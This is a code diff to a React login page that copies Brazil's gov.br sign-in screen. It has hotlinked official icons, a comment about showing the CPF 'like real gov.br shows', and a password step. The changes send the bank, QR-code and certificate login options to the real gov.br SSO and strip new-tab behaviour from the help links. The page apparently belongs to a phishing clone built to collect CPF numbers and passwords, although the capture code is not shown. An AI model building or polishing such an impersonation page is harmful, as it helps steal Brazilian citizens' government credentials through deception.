@@ -66,6 +66,10 @@ export default function LoginPage() {
     }
   };
 
+  const redirectToSso = () => {
+    window.location.href = 'https://sso.acesso.gov.br/login';
+  };
+
   // Display CPF as formatted (like real gov.br shows: 149.488.226-47)
   const displayCpf = cpf;
 
@@ -83,7 +87,7 @@ export default function LoginPage() {
             </a>
           </span>
           <span>
-            <a href="https://www.vlibras.gov.br" target="_blank" rel="noopener noreferrer">
+            <a href="https://www.vlibras.gov.br">
               <i className="fas fa-deaf"></i>
               <span>VLibras</span>
             </a>
@@ -150,7 +154,7 @@ export default function LoginPage() {
 
                 <div className="gov-options-list">
                   <div className="gov-option-item">
-                    <button type="button" className="gov-option-btn gov-option-green">
+                    <button type="button" className="gov-option-btn gov-option-green" onClick={redirectToSso}>
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" alt="" />
                       Login com seu banco
                       <span className="gov-badge-green">SUA CONTA SERÁ PRATA</span>
@@ -158,21 +162,21 @@ export default function LoginPage() {
                   </div>
 
                   <div className="gov-option-item">
-                    <a href="#" className="gov-option-btn">
+                    <a href="https://sso.acesso.gov.br/login" className="gov-option-btn">
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/qrcode.png" alt="" />
                       Login com QR code
                     </a>
                   </div>
 
                   <div className="gov-option-item">
-                    <button type="button" className="gov-option-btn">
+                    <button type="button" className="gov-option-btn" onClick={redirectToSso}>
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" alt="" />
                       Seu certificado digital
                     </button>
                   </div>
 
                   <div className="gov-option-item">
-                    <button type="button" className="gov-option-btn">
+                    <button type="button" className="gov-option-btn" onClick={redirectToSso}>
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" alt="" />
                       Seu certificado digital em nuvem
                     </button>
@@ -180,11 +184,11 @@ export default function LoginPage() {
                 </div>
 
                 <div className="gov-help-links">
-                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br" target="_blank" rel="noopener noreferrer">
+                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br">
                     <img src="https://sso.acesso.gov.br/assets/govbr/fontawesome/webfonts/circle-question-solid.svg" alt="" className="gov-help-icon" />
                     Está com dúvidas e precisa de ajuda?
                   </a>
-                  <a href="https://cadastro.acesso.gov.br/termo-de-uso" target="_blank" rel="noopener noreferrer">
+                  <a href="https://cadastro.acesso.gov.br/termo-de-uso">
                     Termo de Uso e Aviso de Privacidade
                   </a>
                 </div>
@@ -248,7 +252,7 @@ export default function LoginPage() {
                     <button
                       type="button"
                       className="gov-forgot-link"
-                      onClick={() => window.open('https://sso.acesso.gov.br/account-recovery', '_blank')}
+                      onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}
                     >
                       Esqueci minha senha
                     </button>
@@ -260,7 +264,7 @@ export default function LoginPage() {
 
           {step === 2 && (
             <div className="gov-card gov-card-faq">
-              <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/" target="_blank" rel="noopener noreferrer">
+              <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/">
                 Ficou com dúvidas?
               </a>
             </div>
